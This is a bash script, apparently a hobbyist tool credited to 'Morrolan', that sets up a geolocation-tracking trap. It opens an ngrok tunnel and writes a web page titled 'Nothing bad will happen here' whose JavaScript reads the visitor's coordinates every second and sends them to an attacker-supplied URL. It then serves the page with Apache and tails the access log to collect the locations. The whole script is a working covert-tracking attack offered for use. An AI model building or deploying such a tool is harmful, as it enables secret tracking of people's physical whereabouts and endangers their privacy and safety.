#!/bin/bash

#macOS
xterm -e ./ngrok_macos http 8080 & clear

#64_bit
#xterm -e ./ngrok_64 http 80 & clear

#32_Bit
#xterm -e ./ngrok http 80 & clear


echo "            ______________________________________________________   
            7      77  _  77  _  77     77  7  77  7  77  _  77  7   
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                     
                                                            By Morrolan
                                                            "
sleep 2
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>Nothing bad will happen here</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"skull.jpg\");
                background-size: 1000px 1600px;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
    </body>
</html>" > index.html

mv index.html /usr/local/var/www/index.html
cp skull.jpg /usr/local/var/www/skull.jpg
apachectl start
#service apache2 start
#python -m SimpleHTTPServer 80
echo "         ______________________________________________________   
         7      77  _  77  _  77     77  7  77  7  77  _  77  7   
         !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
           7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
           |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
           !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                  " > /usr/local/var/log/httpd/access_log
xterm -e tail -f /usr/local/var/log/httpd/access_log &
clear
exit
